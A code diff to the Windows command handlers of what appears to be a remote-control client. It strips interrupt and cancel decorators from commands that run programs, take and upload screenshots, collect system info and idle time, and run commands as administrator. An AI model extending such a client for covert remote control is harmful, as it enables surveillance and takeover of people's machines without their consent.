@@ -1,6 +1,6 @@
 from client.commands.arguments.decorators import argument_command
 from client.commands.common.commands import CommonCommands
-from client.commands.runtime.interrupts import timeout, cancel_policy, interruptible
+from client.commands.runtime.interrupts import timeout
 from client.commands.platform.services.win.media_service import WinMediaService
 from client.commands.platform.services.win.privilege_service import WinPrivilegeService
 from client.commands.platform.services.win.process_service import WinProcessService
@@ -20,7 +20,6 @@ class WindowsCommands(CommonCommands):
         self.win_privilege = WinPrivilegeService(self)
 
     @desc('Run a program without waiting (detached)', group='shell')
-    @interruptible()
     def run(self, command):
         """
         启动程序但不等待返回（独立运行）
@@ -29,9 +28,8 @@ class WindowsCommands(CommonCommands):
 
     # ------------------ 截图 ------------------ #
     @desc('Capture screenshot', group='platform')
-    @interruptible()
+
     @timeout(30)
-    @cancel_policy(True)
     def screenshot(self):
         """
         截图并上传到服务器
@@ -40,9 +38,8 @@ class WindowsCommands(CommonCommands):
 
     # ------------------ 系统信息 ------------------ #
     @desc('Get system information', group='platform')
-    @interruptible()
+
     @timeout(30)
-    @cancel_policy(True)
     def getinfo(self):
         """
         获取 Windows 系统信息
@@ -51,9 +48,8 @@ class WindowsCommands(CommonCommands):
 
     # ------------------ 用户空闲时间 ------------------ #
     @desc('Get user idle time', group='platform')
-    @interruptible()
+
     @timeout(10)
-    @cancel_policy(True)
     def idletime(self):
         """
         获取用户空闲时间（秒）
@@ -61,7 +57,6 @@ class WindowsCommands(CommonCommands):
         return self.win_system.get_user_idletime()
 
     @desc('Run command as admin', group='system')
-    @interruptible()
     def runasadmin(self, command):
         """
         以管理员权限执行命令
@@ -69,11 +64,9 @@ class WindowsCommands(CommonCommands):
         return self.win_privilege.run_as_admin(command)
 
     @argument_command('netstat', spec=NETSTAT_ARGUMENT_SPEC)
-    @interruptible()
     def _acmd_netstat(self, args_dict, payload=None):
         return self._acmd_netstat_common(args_dict, payload)
 
     @argument_command('ps', spec=PS_ARGUMENT_SPEC)
-    @interruptible()
     def _acmd_ps(self, args_dict, payload=None):
         return self._acmd_ps_common(args_dict, payload)
